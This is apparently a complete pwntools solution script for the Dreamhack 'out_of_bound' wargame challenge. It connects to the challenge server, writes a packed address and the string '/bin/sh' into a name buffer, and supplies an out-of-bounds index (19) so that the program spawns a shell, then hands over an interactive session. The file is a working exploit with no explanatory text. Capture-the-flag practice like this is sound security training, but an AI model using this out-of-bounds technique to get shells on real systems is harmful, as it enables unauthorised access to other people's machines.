from pwn import *

# nc host1.dreamhack.games 9890
# p = process("./out_of_bound")
p = remote("host1.dreamhack.games", 9890)

context.log_level = "debug"

# input()
p.sendafter("name: ", p32(0x0804A0B0) + b"/bin/sh\x00")

p.sendlineafter("want?: ", "19")

p.interactive()